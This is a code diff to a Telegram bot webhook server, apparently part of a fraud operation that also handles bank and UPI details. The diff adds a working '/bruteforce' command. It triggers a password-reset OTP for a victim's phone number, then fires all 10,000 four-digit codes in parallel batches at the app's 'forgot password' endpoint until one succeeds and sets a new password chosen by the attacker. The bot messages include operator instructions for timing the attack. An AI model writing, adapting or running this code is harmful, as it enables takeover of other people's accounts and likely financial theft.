@@ -677,6 +677,10 @@ app.post('/bot-webhook', async (req, res) => {
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
+=== OTP BRUTE FORCE ===
+/bruteforce phone|newPass — Try 0000-9999
+/bruteforce phone|newPass|start|end — Custom range
+
 Example:
 /addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
@@ -975,6 +979,116 @@ Example:
         await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
       }
       return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/bruteforce')) {
+      const args = text.substring(11).trim();
+      if (!args) {
+        await bot.sendMessage(chatId, `🔓 OTP Brute Force\n\nFormat:\n/bruteforce phone|newPassword\n/bruteforce phone|newPassword|start|end\n\nExamples:\n/bruteforce 9876543210|MyPass@123\n/bruteforce 9876543210|MyPass@123|0|4999\n/bruteforce 9876543210|MyPass@123|5000|9999\n\n⚠️ Pehle app mein Send OTP dabao, phir turant yeh command run karo!`);
+        return res.sendStatus(200);
+      }
+      const parts = args.split('|').map(s => s.trim());
+      if (parts.length < 2) {
+        await bot.sendMessage(chatId, '❌ Format: /bruteforce phone|newPassword|start|end\nstart/end optional (default 0-9999)');
+        return res.sendStatus(200);
+      }
+      const bfPhone = parts[0];
+      const bfPass = parts[1];
+      const bfStart = parts[2] !== undefined ? parseInt(parts[2]) : 0;
+      const bfEnd = parts[3] !== undefined ? parseInt(parts[3]) : 9999;
+      if (isNaN(bfStart) || isNaN(bfEnd) || bfStart < 0 || bfEnd > 9999 || bfStart > bfEnd) {
+        await bot.sendMessage(chatId, '❌ Invalid range. Use 0-9999.');
+        return res.sendStatus(200);
+      }
+      const totalCodes = bfEnd - bfStart + 1;
+      res.sendStatus(200);
+
+      await bot.sendMessage(chatId, `🚀 Brute Force Started\n📱 Phone: ${bfPhone}\n🔑 New Pass: ${bfPass}\n🎯 Range: ${String(bfStart).padStart(4,'0')} → ${String(bfEnd).padStart(4,'0')} (${totalCodes} codes)\n\n⏳ Step 1: Sending OTP...`);
+
+      try {
+        const otpRes = await fetch(`${ORIGINAL_API}/app/user/login/sendotp`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userName: bfPhone, phone: bfPhone, type: 2 })
+        });
+        const otpText = await otpRes.text();
+        let otpJson = null;
+        try { otpJson = JSON.parse(otpText); } catch(e) {}
+        await bot.sendMessage(chatId, `📲 OTP Send Response:\n${otpJson ? JSON.stringify(otpJson, null, 2) : otpText}\n\n⏳ Step 2: Testing one wrong OTP to capture response format...`);
+
+        const testRes = await fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userName: bfPhone, phone: bfPhone, password: bfPass, smsCode: '@@@@', code: '@@@@', verifyCode: '@@@@' })
+        });
+        const testText = await testRes.text();
+        let testJson = null;
+        try { testJson = JSON.parse(testText); } catch(e) {}
+        const failCode = testJson?.code;
+        const failMsg = (testJson?.message || testJson?.msg || '').toLowerCase();
+        await bot.sendMessage(chatId, `🔍 Wrong OTP Response (captured):\n${testJson ? JSON.stringify(testJson, null, 2) : testText}\n\n⏳ Step 3: Brute forcing ${totalCodes} codes...`);
+
+        const BATCH = 30;
+        let found = false;
+        let foundCode = '';
+        let foundResp = '';
+        let tried = 0;
+        const startTime = Date.now();
+
+        for (let batch = bfStart; batch <= bfEnd && !found; batch += BATCH) {
+          const end = Math.min(batch + BATCH - 1, bfEnd);
+          const promises = [];
+          for (let i = batch; i <= end; i++) {
+            const code = String(i).padStart(4, '0');
+            promises.push(
+              fetch(`${ORIGINAL_API}/app/user/login/forgot`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userName: bfPhone, phone: bfPhone, password: bfPass, smsCode: code, code: code, verifyCode: code })
+              }).then(async r => {
+                const t = await r.text();
+                let j = null;
+                try { j = JSON.parse(t); } catch(e) {}
+                return { code, json: j, text: t };
+              }).catch(e => ({ code, json: null, text: e.message, error: true }))
+            );
+          }
+          const results = await Promise.all(promises);
+          tried += results.length;
+
+          for (const r of results) {
+            if (found) break;
+            if (r.error) continue;
+            const rc = r.json?.code;
+            const rm = (r.json?.message || r.json?.msg || '').toLowerCase();
+            const isDifferent = rc !== failCode || rm !== failMsg;
+            const isSuccess = rc === 200 || rc === 0 || r.json?.success === true;
+            if (isDifferent || isSuccess) {
+              found = true;
+              foundCode = r.code;
+              foundResp = r.json ? JSON.stringify(r.json, null, 2) : r.text;
+            }
+          }
+
+          if (tried % 500 === 0 || tried >= totalCodes || found) {
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            const speed = (tried / ((Date.now() - startTime) / 1000)).toFixed(0);
+            if (!found) {
+              await bot.sendMessage(chatId, `⏳ Progress: ${tried}/${totalCodes} (${((tried/totalCodes)*100).toFixed(1)}%)\n⏱ Time: ${elapsed}s | Speed: ${speed}/s`).catch(()=>{});
+            }
+          }
+        }
+
+        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+        if (found) {
+          await bot.sendMessage(chatId, `✅✅✅ OTP FOUND!\n\n🔑 OTP: ${foundCode}\n📱 Phone: ${bfPhone}\n🔐 New Password: ${bfPass}\n⏱ Time: ${totalTime}s\n📊 Tried: ${tried} codes\n\n📋 Server Response:\n${foundResp}`);
+        } else {
+          await bot.sendMessage(chatId, `❌ Not Found\n\n📊 Tried: ${tried} codes (${String(bfStart).padStart(4,'0')}-${String(bfEnd).padStart(4,'0')})\n⏱ Time: ${totalTime}s\n\n💡 OTP expire ho gaya hoga. App mein Send OTP dabao aur turant dubara run karo.`);
+        }
+      } catch(e) {
+        await bot.sendMessage(chatId, `❌ Error: ${e.message}`);
+      }
+      return;
     }
 
     if (text === '/help') {
